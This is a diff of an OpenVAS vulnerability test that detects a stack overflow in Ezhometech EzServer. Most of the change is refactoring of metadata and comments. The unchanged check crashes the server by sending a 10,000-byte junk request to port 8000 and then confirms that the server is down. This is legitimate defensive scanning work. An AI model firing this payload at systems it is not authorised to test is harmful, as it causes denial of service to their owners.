@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ezhometech_ezserver_long_request_bof_vuln.nasl 4797 2016-12-17 14:04:59Z cfi $
+# $Id: gb_ezhometech_ezserver_long_request_bof_vuln.nasl 11003 2018-08-16 11:08:00Z asteins $
 #
 # Ezhometech Ezserver Long 'GET' Request Stack Overflow Vulnerability
 #
@@ -27,11 +27,11 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802438");
-  script_version("$Revision: 4797 $");
+  script_version("$Revision: 11003 $");
   script_bugtraq_id(54056);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2016-12-17 15:04:59 +0100 (Sat, 17 Dec 2016) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-16 13:08:00 +0200 (Thu, 16 Aug 2018) $");
   script_tag(name:"creation_date", value:"2012-06-20 17:01:48 +0530 (Wed, 20 Jun 2012)");
   script_name("Ezhometech Ezserver Long 'GET' Request Stack Overflow Vulnerability");
   script_category(ACT_DENIAL);
@@ -47,29 +47,19 @@ if(description)
   script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113860/ezserver_http.rb.txt");
   script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113851/ezhometechezserver-overflow.txt");
 
-  tag_impact = "Successful exploitation may allow remote attackers to cause the
+  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
   application to crash, creating a denial of service condition.
 
-  Impact Level: System/Application";
-
-  tag_affected = "Ezhometech EzServer version 6.4 and prior";
-
-  tag_insight = "Buffer overflow condition exist in URL handling, sending long
-  GET request to the server on port 8000 will cause server process to exit.";
-
-  tag_solution = "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
+  Impact Level: System/Application");
+  script_tag(name:"affected", value:"Ezhometech EzServer version 6.4 and prior");
+  script_tag(name:"insight", value:"Buffer overflow condition exist in URL handling, sending long
+  GET request to the server on port 8000 will cause server process to exit.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore.
   General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.";
-
-  tag_summary = "This host is running Ezhometech Ezserver and is prone stack based
-  buffer overflow vulnerability.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"This host is running Ezhometech Ezserver and is prone stack based
+  buffer overflow vulnerability.");
 
   script_tag(name:"qod_type", value:"remote_vul");
   script_tag(name:"solution_type", value:"WillNotFix");
@@ -80,41 +70,26 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-soc= "";
-sndReq = "";
-rcvRes = NULL;
-port = 0;
-
-## Get HTTP Port
 port = get_http_port( default:8000 );
 
-## Request to confirm application
 sndReq = http_get( item:"/admin/index.htm", port:port );
 rcvRes = http_keepalive_send_recv( port:port, data:sndReq );
 
-## Confirm the application
 if( isnull( rcvRes ) || ">Ezhometech<" >!< rcvRes ) exit( 0 );
 
-## Create HTTP socket
 soc = http_open_socket( port );
 if( ! soc ) exit( 0 );
 
 
-## Construct the attack request and send
 send(socket:soc, data:crap(data:raw_string(0x43), length: 10000));
 
-## Close HTTP socket
 http_close_socket(soc);
 
-## Wait for some time
 sleep(3);
 
-## check the server is still responses
 sndReq = http_get( item:"/admin/index.htm", port:port );
 rcvRes = http_send_recv( port:port, data:sndReq );
 
-## Confirm server crashed
 if( http_is_dead( port:port) && isnull( rcvRes ) && ">Ezhometech<" >!< rcvRes ) {
   security_message( port:port );
   exit( 0 );
